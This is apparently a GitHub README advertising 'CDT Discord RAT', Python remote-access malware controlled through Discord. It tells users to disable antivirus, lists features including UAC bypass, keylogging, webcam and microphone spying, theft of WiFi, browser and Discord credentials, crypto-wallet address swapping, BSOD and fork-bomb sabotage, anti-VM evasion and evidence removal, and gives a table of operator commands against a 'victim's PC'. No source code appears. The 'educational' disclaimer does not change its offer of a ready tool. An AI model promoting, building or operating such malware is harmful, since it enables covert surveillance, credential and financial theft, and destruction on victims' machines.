<span align='left'>

# `CDT DISCORD RAT`

`Advanced RAT malware written in Python, fully controllable through Discord with dedicated GUI builder to make preparation easier.`

# Disclaimer
> Information and code provided on this repository are for educational purposes only. The creator is no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.
--------------------

# Preparation<br />

Only works on windows:
Disable your antivirus due to false virus alert
Run CDTDRAT.exe

--------------------

# Features
### CDT malware can do plenty of things, like:
- handle multiple PCs (not only one, like in most of the cases)
- UAC Bypass (gain *Administrative permissions* on startup)
- **delete itself whenever you want**
- log every key pressed on *keyboard* (keylogger)
- take *screenshots* anytime you want
- record *screen* anytime you want
- elevate itself to *critical process* (will trigger *Blue Screen of Death* when killed)
- directly *manipulate* **victim's PC graphics** (display custom "things"->[bitmaps, images, texts, glitch effects])
- turn **off**/**on** *monitors* of victim's PC
- **block** access to any *website*
- browse and kill running *processes*
- disable processes (make certain processes **impossible** to run)
- *communicate* with the victim in several ways
- use *Text-To-Speech* on victim's PC
- take images from *webcam*
- *block* the *mouse* and *keyboard*
- steal saved *WiFi* passwords
- grab *history*, *cookies* and *passwords* saved in web browsers
- grab *discord tokens*
- grab system information
- manipulate *Windows sounds* settings (change the *volume*)
- play **audio files** on victim's PC (in background)
- record *microphone* input (24/7) and save it in *.wav* files
- stream live *microphone* input on voice channel
- browse *files* on target PC
- upload and download *files* from target PC
- remove *files* from target PC
- execute *files* on target PC
- replace copied *crypto currency wallet* addresses to your [configured] ones
- trigger *jumpscares*
- trigger *Blue Screen of Death*
- execute *fork bomb* (crash the PC)
- *Anti-VM* (CDT won't run on Virtual Machines, f.ex.: VirtualBox, VMWare)
- run *shell* commands (CMD/Powershell)
- ***Debug Mode*** for easier testing and `contribution`

--------------------

# Available commands
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.ss`</a> - take screenshot at any time<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.screenrec`</a> - record the screen for 15 seconds<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.critical-enable`</a> - elevates the process to critical status (`.critical-disable` to undo)<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.display-graphic`</a> - manipulate low-level graphics by displaying pixels prepared in DrawlingStudio<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.display-glitch <name>`</a> - display specified screen glitch<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.monitors-off`</a> - turn off all monitors (`.monitors-on` to turn back on)<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.website-block <website>`</a> - block specified website from being accessed from any browser (`.website-unblock <website>` to unblock it)<br />
<a href="https://github.com/Gun-spec/CDT-malware#show-what-to-show">          `.show <what-to-show>`</a> - get list of running processes or available commands<br />
<a href="https://github.com/Gun-spec/CDT-malware#kill-process-id">            `.kill <process-name-or-id>`</a> - kill any running process<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.blacklist <process-name>`</a> - adds specified process to the blacklist (victim won't be able to run it)<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.whitelist <process-name>`</a> - removes specified process from the blacklist (victim will be able to run it) <br />
<a href="https://github.com/Gun-spec/CDT-malware#kill-process-id">            `.foreground`</a> - get active window process name<br />
<a href="https://github.com/Gun-spec/CDT-malware#kill-process-id">            `.msg title="<title>" text="<text>" style=<style>`</a> - send a message to victim and get the response<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.tts <message>`</a> - plays a *Text-to-Speech* message on victim's PC<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.webcam <action>`</a> -  use connected webcam (currently supports photos shooting)<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.block-input`</a> - block the mouse and keyboard(`.unblock-input` to unblock it)<br />
<a href="https://github.com/Gun-spec/CDT-malware#grab-what-to-grab">          `.grab <what-to-grab>`</a> - grab for example saved passwords in web browsers<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.volume <value>`</a> - change the audio output volume on victim's PC<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.play [<file>]`</a> - play any *.mp3* file on the victim's PC (existing one or sent in the next message if no filename was provided)<br />
<a href="https://github.com/Gun-spec/CDT-malware#join">                       `.join`</a> - join voice-channel and stream live microphone input<br />
<a href="https://github.com/Gun-spec/CDT-malware#pwd">                        `.pwd`</a> - show working directory<br />
<a href="https://github.com/Gun-spec/CDT-malware#ls">                         `.ls`</a> - list content of working directory<br />
<a href="https://github.com/Gun-spec/CDT-malware#tree">                       `.tree`</a> - show tree of working directory<br />
<a href="https://github.com/Gun-spec/CDT-malware#cd-directory">               `.cd <directory>`</a> - change working directory<br />
<a href="https://github.com/Gun-spec/CDT-malware#upload-type-filename">       `.upload <type> [<name>]`</a> - upload any file or zipped directory (also greater than 8MB ones) onto target PC<br />
<a href="https://github.com/Gun-spec/CDT-malware#download-file-or-directory"> `.download <file-or-directory>`</a> - download any file or zipped directory (also greater than 8MB ones) from target PC<br />
<a href="https://github.com/Gun-spec/CDT-malware#remove-file-or-dir">         `.remove <file-or-directory>`</a> - remove file or directory on target PC<br />
<a href="https://github.com/Gun-spec/CDT-malware#execute-file">               `.execute <file>`</a> - run any file on target PC<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.start-clipper`</a> - start crypto-clipper (swap crypto currency wallet addresses to your ones)(`.stop-clipper` to stop it)<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.jumpscare [<preset>]`</a> - play very loud and rapidly flashing video or other graphics<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.bsod`</a> - trigger Blue Screen of Death<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.forkbomb`</a> - execute fork bomb<br />
<a href="https://github.com/Gun-spec/CDT-malware#ss">                         `.cmd <command>`</a> - execute shell command on victim's PC and send back the output<br />
<a href="https://github.com/Gun-spec/CDT-malware#implode">                    `.implode`</a> - remove CDT from target PC and clean the "evidence"<br />
<a href="https://github.com/Gun-spec/CDT-malware#clear">                      `.clear`</a> - clear messages from file-related channel<br /

### ToDo

List of features that should appear in following release
- [ ] grab sessions from popular applications (Steam/Minecraft/Metamask/Exodus/Roblox)
